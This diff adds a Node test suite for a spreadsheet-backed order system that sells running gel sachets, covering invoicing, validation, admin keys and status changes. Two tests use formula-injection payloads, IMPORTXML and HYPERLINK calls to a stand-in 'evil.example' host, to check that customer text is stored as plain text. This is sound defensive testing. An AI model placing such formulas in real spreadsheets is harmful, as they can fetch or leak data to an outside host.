@@ -1,0 +1,469 @@
+'use strict';
+// Run with: npm test
+const test = require('node:test');
+const assert = require('node:assert/strict');
+const { createGas } = require('./gas-mock');
+
+let seq = 0;
+const rid = () => 'req_' + String(++seq).padStart(6, '0') + 'abcd';
+
+const BANK = {
+  bank_name: 'Test Bank', account_holder: 'G Bolus', account_number: '0012345678',
+  branch_code: '250655', account_type: 'Cheque'
+};
+
+// A configured system: price 40, delivery 30, bank details set, alerts on.
+function ready() {
+  const gas = createGas();
+  gas.run('setup()');
+  const key = gas.key();
+  const saved = gas.call(Object.assign(
+    { action: 'saveSettings', key },
+    { values: Object.assign({ price: '40', delivery_fee: '30', alert_email: 'greg@example.com' }, BANK) }
+  ));
+  assert.equal(saved.ok, true, JSON.stringify(saved));
+  return { gas, key };
+}
+
+const order = (over) => Object.assign({
+  action: 'order', name: 'Jane Doe', contact: '@jane', address: '12 Beach Rd, Sea Point',
+  notes: '', qty: 3, areaConfirmed: true, requestId: rid(), expectedTotal: 150, website: ''
+}, over);
+
+const dm = (key, over) => Object.assign({
+  action: 'create', key, name: 'Sam', contact: '', address: '', notes: '', qty: 2, requestId: rid()
+}, over);
+
+function wipeOrders(gas) {
+  const s = gas.sheet('Orders');
+  for (const k of [...s.cells.keys()]) if (Number(k.split(',')[0]) >= 2) s.cells.delete(k);
+}
+
+test('setup creates the tabs, defaults and an admin key, and is safe to repeat', () => {
+  const gas = createGas();
+  gas.run('setup()');
+  assert.ok(gas.sheet('Orders'));
+  assert.ok(gas.sheet('Settings'));
+  assert.equal(gas.sheet('Sheet1'), null, 'empty default tab removed');
+  const header = gas.sheet('Orders').getRange(1, 1, 1, 15).getValues()[0];
+  assert.equal(header[0], 'Invoice');
+  assert.equal(header[14], 'Request ID');
+  const key = gas.key();
+  assert.match(key, /^[0-9a-f]{64}$/);
+
+  // Hand-edit a setting, run setup again: value and key survive.
+  const settings = gas.rows('Settings');
+  const brandRow = settings.findIndex((r) => r.Key === 'brand_name') + 2;
+  gas.sheet('Settings').getRange(brandRow, 2).setValue('Hand Edited');
+  gas.run('setup()');
+  assert.equal(gas.key(), key);
+  assert.equal(gas.rows('Settings').find((r) => r.Key === 'brand_name').Value, 'Hand Edited');
+  assert.equal(gas.rows('Settings').filter((r) => r.Key === 'price').length, 1, 'no duplicate rows');
+});
+
+test('orders are refused until price and bank details are set', () => {
+  const gas = createGas();
+  gas.run('setup()');
+  const cfg = gas.call({ action: 'config' });
+  assert.equal(cfg.ok, true);
+  assert.equal(cfg.config.ready, false);
+  const r = gas.call(order());
+  assert.equal(r.ok, false);
+  assert.equal(r.error, 'not_ready');
+  assert.equal(gas.rows('Orders').length, 0);
+});
+
+test('public config shows the price but no bank details', () => {
+  const { gas } = ready();
+  const cfg = gas.call({ action: 'config' }).config;
+  assert.deepEqual(cfg, {
+    brand: 'Supa Juice', product: 'Running gel sachet', price: 40, fee: 30,
+    currency: 'R', area: 'Cape Town', maxQty: 20, ready: true
+  });
+  assert.ok(!JSON.stringify(cfg).includes('0012345678'));
+});
+
+test('a kiosk order is numbered, totalled on the server, stored and returned with bank details', () => {
+  const { gas } = ready();
+  const r = gas.call(order({ price: 1, total: 1, fee: 0 })); // the page cannot set money fields
+  assert.equal(r.ok, true, JSON.stringify(r));
+  assert.equal(r.order.invoice, 'SJ-0001');
+  assert.equal(r.order.total, 150);
+  assert.equal(r.order.status, 'Awaiting payment');
+  assert.equal(r.order.created, '2026-10-28 15:41');
+  assert.equal(r.bank.number, '0012345678', 'leading zero kept');
+  assert.equal(r.brand, 'Supa Juice');
+
+  const rows = gas.rows('Orders');
+  assert.equal(rows.length, 1);
+  assert.equal(rows[0].Source, 'kiosk');
+  assert.equal(rows[0].Qty, 3);
+  assert.equal(rows[0]['Unit price'], 40);
+  assert.equal(rows[0]['Delivery fee'], 30);
+  assert.equal(rows[0].Total, 150);
+
+  assert.equal(gas.mail.length, 1);
+  assert.equal(gas.mail[0].to, 'greg@example.com');
+  assert.equal(gas.mail[0].subject, 'New order SJ-0001: 3 x Running gel sachet (R150)');
+  assert.match(gas.mail[0].body, /Jane Doe/);
+});
+
+test('invoice numbers never repeat, even after rows are deleted, until numbering is reset', () => {
+  const { gas } = ready();
+  assert.equal(gas.call(order()).order.invoice, 'SJ-0001');
+  assert.equal(gas.call(order()).order.invoice, 'SJ-0002');
+  wipeOrders(gas);
+  assert.equal(gas.call(order()).order.invoice, 'SJ-0003');
+
+  assert.throws(() => gas.run('resetNumbering()'), /Delete all the order rows/);
+  wipeOrders(gas);
+  gas.run('resetNumbering()');
+  assert.equal(gas.call(order()).order.invoice, 'SJ-0001');
+});
+
+test('numbering continues from the highest invoice in the sheet if the counter is lost', () => {
+  const { gas } = ready();
+  gas.call(order());
+  gas.call(order());
+  gas.store.delete('LAST_NO'); // for example the Sheet was copied to a new account
+  assert.equal(gas.call(order()).order.invoice, 'SJ-0003');
+});
+
+test('the same request id returns the existing order and does not email twice', () => {
+  const { gas } = ready();
+  const first = gas.call(order({ requestId: 'same_request_1' }));
+  const again = gas.call(order({ requestId: 'same_request_1' }));
+  assert.equal(first.order.invoice, again.order.invoice);
+  assert.equal(gas.rows('Orders').length, 1);
+  assert.equal(gas.mail.length, 1);
+});
+
+test('the hidden honeypot field rejects bots without writing a row', () => {
+  const { gas } = ready();
+  const r = gas.call(order({ website: 'http://spam.example' }));
+  assert.equal(r.ok, false);
+  assert.equal(r.error, 'rejected');
+  assert.equal(gas.rows('Orders').length, 0);
+});
+
+test('invalid kiosk input is rejected with a readable message', () => {
+  const { gas } = ready();
+  const bad = [
+    [{ name: '  ' }, /name/i],
+    [{ contact: 'a' }, /Instagram handle or phone/],
+    [{ address: '' }, /address/i],
+    [{ areaConfirmed: false }, /delivery area/],
+    [{ areaConfirmed: 'true' }, /delivery area/],
+    [{ qty: 0 }, /quantity/],
+    [{ qty: -2 }, /quantity/],
+    [{ qty: 1.5 }, /quantity/],
+    [{ qty: 'abc' }, /quantity/],
+    [{ qty: 21 }, /most you can order/]
+  ];
+  for (const [over, message] of bad) {
+    const r = gas.call(order(over));
+    assert.equal(r.ok, false, JSON.stringify(over));
+    assert.equal(r.error, 'invalid', JSON.stringify(over));
+    assert.match(r.message, message, JSON.stringify(over));
+  }
+  assert.equal(gas.rows('Orders').length, 0);
+  assert.equal(gas.call(order({ qty: '2', expectedTotal: 110 })).ok, true, 'numeric string quantity is fine');
+});
+
+test('long and multi-line text is trimmed and flattened', () => {
+  const { gas } = ready();
+  const r = gas.call(order({ name: 'A'.repeat(200), address: '1 Long St\nGardens\r\nCape Town', notes: 'x'.repeat(500) }));
+  assert.equal(r.ok, true);
+  assert.equal(r.order.name.length, 80);
+  assert.equal(r.order.address, '1 Long St, Gardens, Cape Town');
+  assert.equal(r.order.notes.length, 300);
+});
+
+test('a stale total is refused and the fresh config is returned', () => {
+  const { gas, key } = ready();
+  gas.call({ action: 'saveSettings', key, values: { price: '45' } });
+  const r = gas.call(order({ expectedTotal: 150 }));
+  assert.equal(r.ok, false);
+  assert.equal(r.error, 'price_changed');
+  assert.equal(r.config.price, 45);
+  assert.equal(gas.rows('Orders').length, 0);
+  const ok = gas.call(order({ expectedTotal: 165 }));
+  assert.equal(ok.ok, true);
+  assert.equal(ok.order.total, 165);
+});
+
+test('old orders keep the price they were made at', () => {
+  const { gas, key } = ready();
+  gas.call(order());
+  gas.call({ action: 'saveSettings', key, values: { price: '99', delivery_fee: '10' } });
+  const listed = gas.call({ action: 'list', key });
+  assert.equal(listed.orders[0].total, 150);
+  assert.equal(listed.orders[0].price, 40);
+});
+
+test('totals are exact with cents', () => {
+  const { gas, key } = ready();
+  gas.call({ action: 'saveSettings', key, values: { price: '33.33', delivery_fee: '10' } });
+  const r = gas.call(order({ qty: 3, expectedTotal: 109.99 }));
+  assert.equal(r.ok, true, JSON.stringify(r));
+  assert.equal(r.order.total, 109.99);
+});
+
+test('free delivery works', () => {
+  const { gas, key } = ready();
+  gas.call({ action: 'saveSettings', key, values: { delivery_fee: '0' } });
+  const r = gas.call(order({ qty: 2, expectedTotal: 80 }));
+  assert.equal(r.order.total, 80);
+});
+
+test('customer text can never become a formula', () => {
+  const { gas } = ready();
+  const evil = '=IMPORTXML("http://evil.example","//a")';
+  const r = gas.call(order({ name: evil, contact: '+27 82 000 0000', address: '@cmd', notes: '-2+3' }));
+  assert.equal(r.ok, true);
+  const sheet = gas.sheet('Orders');
+  for (const col of [4, 5, 6, 7]) {
+    const cell = sheet.cells.get('2,' + col);
+    assert.equal(cell.formula, false, 'column ' + col);
+    assert.ok(!/^[=+\-@]/.test(cell.v), 'column ' + col + ' starts with ' + cell.v[0]);
+  }
+  assert.equal(r.order.name, evil, 'trimmed value still reads the same');
+});
+
+test('the public page is capped per hour, Greg is not, and the cap resets', () => {
+  const { gas, key } = ready();
+  for (let i = 0; i < 12; i++) assert.equal(gas.call(order()).ok, true, 'order ' + i);
+  const blocked = gas.call(order());
+  assert.equal(blocked.ok, false);
+  assert.equal(blocked.error, 'busy');
+  assert.equal(gas.call(dm(key)).ok, true, 'DM orders are not capped');
+  gas.clock.now += 3600 * 1000;
+  assert.equal(gas.call(order()).ok, true);
+});
+
+test('a busy lock returns a friendly error instead of a crash', () => {
+  const { gas } = ready();
+  gas.lock.failNext = true;
+  const r = gas.call(order());
+  assert.equal(r.ok, false);
+  assert.equal(r.error, 'busy');
+  assert.equal(gas.rows('Orders').length, 0);
+  assert.equal(gas.call(order()).ok, true, 'lock was not left held');
+});
+
+test('writes keep working after the 1000-row grid is full', () => {
+  const { gas } = ready();
+  gas.sheet('Orders').maxRows = 3;
+  for (let i = 0; i < 4; i++) assert.equal(gas.call(order()).ok, true, 'order ' + i);
+  assert.equal(gas.rows('Orders').length, 4);
+  assert.ok(gas.sheet('Orders').maxRows >= 5);
+});
+
+test('admin actions need the key and kiosk visitors cannot reach them', () => {
+  const { gas, key } = ready();
+  gas.call(order());
+  for (const body of [
+    { action: 'list' },
+    { action: 'list', key: 'nope' },
+    { action: 'list', key: 12345 },
+    { action: 'list', key: key + 'x' },
+    { action: 'create', name: 'x', qty: 1 },
+    { action: 'setStatus', invoice: 'SJ-0001', status: 'Paid' },
+    { action: 'getSettings' },
+    { action: 'saveSettings', values: { price: '1' } }
+  ]) {
+    const r = gas.call(body);
+    assert.equal(r.ok, false, JSON.stringify(body));
+    assert.equal(r.error, 'unauthorized', JSON.stringify(body));
+  }
+  assert.ok(gas.sleeps.length >= 8, 'failed attempts are slowed down');
+  assert.equal(gas.call({ action: 'list', key }).ok, true);
+  assert.equal(gas.rows('Orders')[0].Status, 'Awaiting payment');
+});
+
+test('admin is locked when no key exists', () => {
+  const gas = createGas();
+  gas.run('setup()');
+  gas.store.delete('ADMIN_KEY');
+  assert.equal(gas.call({ action: 'list', key: '' }).error, 'unauthorized');
+  assert.equal(gas.call({ action: 'list' }).error, 'unauthorized');
+});
+
+test('rotating the admin key invalidates the old one', () => {
+  const { gas, key } = ready();
+  gas.run('rotateAdminKey()');
+  assert.notEqual(gas.key(), key);
+  assert.equal(gas.call({ action: 'list', key }).error, 'unauthorized');
+  assert.equal(gas.call({ action: 'list', key: gas.key() }).ok, true);
+});
+
+test('Greg can add a DM order: no email, address and contact optional', () => {
+  const { gas, key } = ready();
+  const r = gas.call(dm(key, { name: 'Sam', qty: 2 }));
+  assert.equal(r.ok, true, JSON.stringify(r));
+  assert.equal(r.order.invoice, 'SJ-0001');
+  assert.equal(r.order.total, 110);
+  assert.equal(r.order.source, 'dm');
+  assert.equal(gas.mail.length, 0);
+  assert.equal(gas.call(dm(key, { name: '' })).error, 'invalid');
+});
+
+test('list returns orders and the admin config with bank details', () => {
+  const { gas, key } = ready();
+  gas.call(order());
+  gas.call(dm(key));
+  const r = gas.call({ action: 'list', key });
+  assert.equal(r.ok, true);
+  assert.equal(r.orders.length, 2);
+  assert.equal(r.orders[0].invoice, 'SJ-0001');
+  assert.equal(r.config.bank.number, '0012345678');
+  assert.equal(r.config.prefix, 'SJ');
+  assert.equal(r.config.ready, true);
+  assert.ok(!('requestId' in r.orders[0]));
+});
+
+test('status changes follow the allowed moves and keep the dates right', () => {
+  const { gas, key } = ready();
+  gas.call(order());
+  const set = (status) => gas.call({ action: 'setStatus', key, invoice: 'SJ-0001', status });
+
+  // not allowed straight from Awaiting payment to Delivered
+  let r = set('Delivered');
+  assert.equal(r.error, 'invalid');
+
+  gas.clock.now += 3600 * 1000;
+  r = set('Paid');
+  assert.equal(r.ok, true);
+  assert.equal(r.order.status, 'Paid');
+  assert.equal(r.order.paidOn, '2026-10-28 16:41');
+  assert.equal(r.order.deliveredOn, '');
+
+  gas.clock.now += 3600 * 1000;
+  r = set('Delivered');
+  assert.equal(r.order.status, 'Delivered');
+  assert.equal(r.order.paidOn, '2026-10-28 16:41');
+  assert.equal(r.order.deliveredOn, '2026-10-28 17:41');
+
+  // undo delivered: back to Paid, original paid date kept
+  r = set('Paid');
+  assert.equal(r.order.status, 'Paid');
+  assert.equal(r.order.paidOn, '2026-10-28 16:41');
+  assert.equal(r.order.deliveredOn, '');
+
+  // undo paid: back to Awaiting, dates cleared
+  r = set('Awaiting payment');
+  assert.equal(r.order.status, 'Awaiting payment');
+  assert.equal(r.order.paidOn, '');
+
+  // cancel and reopen
+  assert.equal(set('Cancelled').order.status, 'Cancelled');
+  assert.equal(set('Paid').error, 'invalid');
+  assert.equal(set('Awaiting payment').order.status, 'Awaiting payment');
+
+  // same status again is a harmless no-op
+  assert.equal(set('Awaiting payment').ok, true);
+
+  const row = gas.rows('Orders')[0];
+  assert.equal(row.Status, 'Awaiting payment');
+  assert.equal(row['Paid on'], '');
+});
+
+test('status changes reject unknown orders and statuses', () => {
+  const { gas, key } = ready();
+  assert.equal(gas.call({ action: 'setStatus', key, invoice: 'SJ-9999', status: 'Paid' }).error, 'not_found');
+  gas.call(order());
+  assert.equal(gas.call({ action: 'setStatus', key, invoice: 'SJ-0001', status: 'Refunded' }).error, 'invalid');
+  assert.equal(gas.call({ action: 'setStatus', key, invoice: 'sj-0001', status: 'Paid' }).ok, true, 'invoice lookup ignores case');
+});
+
+test('settings are validated, whitelisted and stored as text', () => {
+  const { gas, key } = ready();
+  const bad = [
+    { price: 'abc' }, { price: '-5' }, { price: '4O' }, { price: '1-2' }, { delivery_fee: '-1' }, { max_quantity: '0' }, { max_quantity: '2.5' },
+    { invoice_prefix: 'TOO-LONG!' }, { alert_email: 'not an email' }, { brand_name: '  ' }
+  ];
+  for (const values of bad) {
+    const r = gas.call({ action: 'saveSettings', key, values });
+    assert.equal(r.ok, false, JSON.stringify(values));
+    assert.equal(r.error, 'invalid', JSON.stringify(values));
+  }
+  const r = gas.call({
+    action: 'saveSettings', key,
+    values: { price: 'R42,50', invoice_prefix: 'bib', brand_name: 'Supa Juice Co', max_quantity: '10', evil_key: 'x', account_number: '0099887766' }
+  });
+  assert.equal(r.ok, true, JSON.stringify(r));
+  assert.equal(r.values.price, '42.5');
+  assert.equal(r.values.invoice_prefix, 'BIB');
+  assert.equal(r.values.account_number, '0099887766');
+  assert.ok(!('evil_key' in r.values));
+  assert.ok(!gas.rows('Settings').some((row) => row.Key === 'evil_key'));
+  assert.equal(r.config.price, 42.5);
+  assert.equal(r.config.maxQty, 10);
+
+  // new prefix applies to the next order
+  assert.equal(gas.call(order({ qty: 1, expectedTotal: 72.5 })).order.invoice, 'BIB-0001');
+});
+
+test('a setting that starts with = is stored as text', () => {
+  const { gas, key } = ready();
+  gas.call({ action: 'saveSettings', key, values: { payment_note: '=HYPERLINK("http://evil.example")' } });
+  const settings = gas.sheet('Settings');
+  const keys = gas.rows('Settings').map((r) => r.Key);
+  const row = keys.indexOf('payment_note') + 2;
+  assert.equal(settings.cells.get(row + ',2').formula, false);
+});
+
+test('a missing settings row is added when saved', () => {
+  const { gas, key } = ready();
+  const settings = gas.sheet('Settings');
+  const keys = gas.rows('Settings').map((r) => r.Key);
+  const row = keys.indexOf('account_type') + 2;
+  for (const k of [...settings.cells.keys()]) if (k.startsWith(row + ',')) settings.cells.delete(k);
+  assert.equal(gas.call({ action: 'getSettings', key }).values.account_type, '');
+  gas.call({ action: 'saveSettings', key, values: { account_type: 'Savings' } });
+  assert.equal(gas.call({ action: 'getSettings', key }).values.account_type, 'Savings');
+});
+
+test('bad requests do not crash the endpoint', () => {
+  const { gas, key } = ready();
+  assert.equal(gas.raw('not json').error, 'bad_request');
+  assert.equal(gas.raw('').error, 'bad_request');
+  assert.equal(gas.raw('"just a string"').error, 'bad_request');
+  assert.equal(gas.raw('null').error, 'bad_request');
+  assert.equal(gas.call({ action: 'nonsense' }).error, 'unauthorized');
+  assert.equal(gas.call({ action: 'nonsense', key }).error, 'bad_request');
+});
+
+test('an unexpected failure returns a generic error and is logged, not leaked', () => {
+  const gas = createGas(); // no setup: the tabs do not exist
+  const r = gas.call({ action: 'config' });
+  assert.equal(r.ok, false);
+  assert.equal(r.error, 'not_ready');
+  const { gas: g2 } = ready();
+  g2.ctx.SpreadsheetApp.getActiveSpreadsheet = () => { throw new Error('secret internals'); };
+  const r2 = g2.call({ action: 'config' });
+  assert.equal(r2.error, 'server_error');
+  assert.ok(!JSON.stringify(r2).includes('secret'));
+  assert.ok(g2.errors.some((e) => e.includes('secret internals')));
+});
+
+test('opening the web app address shows it is alive, and config can be read with GET', () => {
+  const { gas } = ready();
+  assert.deepEqual(gas.get({}), { ok: true, service: 'orders' });
+  assert.equal(gas.get({ action: 'config' }).config.price, 40);
+});
+
+test('a failing alert email does not fail the order', () => {
+  const { gas } = ready();
+  gas.ctx.MailApp.sendEmail = () => { throw new Error('quota'); };
+  const r = gas.call(order());
+  assert.equal(r.ok, true);
+  assert.ok(gas.errors.some((e) => e.includes('Alert email failed')));
+});
+
+test('no alert email address means no email', () => {
+  const { gas, key } = ready();
+  gas.call({ action: 'saveSettings', key, values: { alert_email: '' } });
+  gas.call(order());
+  assert.equal(gas.mail.length, 0);
+});
